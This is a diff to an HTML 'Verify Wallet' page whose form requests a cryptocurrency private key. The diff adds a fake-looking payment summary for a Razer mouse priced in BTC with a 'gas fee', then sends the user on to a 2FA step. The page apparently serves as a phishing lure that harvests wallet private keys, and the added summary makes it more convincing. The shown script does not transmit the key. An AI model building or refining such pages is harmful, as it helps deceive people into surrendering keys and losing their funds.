@@ -46,6 +46,10 @@
             margin-top: 20px;
             width: 100%;
         }
+        .summary {
+            text-align: left;
+            margin-bottom: 20px;
+        }
     </style>
 </head>
 <body>
@@ -74,6 +78,13 @@
 
     <div class="container">
         <h1>Verify Wallet</h1>
+        <div class="summary">
+            <h3>Payment Summary</h3>
+            <p><strong>Item:</strong> Razer Mouse with 2 year warranty</p>
+            <p><strong>Price:</strong> $60.00 (0.00064 BTC)</p>
+            <p><strong>Gas Fee:</strong> $1.50 (0.000016 BTC)</p>
+            <p><strong>Total Amount:</strong> $61.50 (0.000656 BTC)</p>
+        </div>
         <form>
             <div class="form-group">
                 <label for="privateKey">Private Key:</label>
@@ -89,7 +100,7 @@
             if (privateKey === "") {
                 alert("Please enter your wallet's private key");
             } else {
-                alert("Wallet Verified! Proceeding to 2fa.");
+                alert("Wallet Verified! Proceeding to 2FA.");
                 window.location.href = '2fa.html';
             }
         }
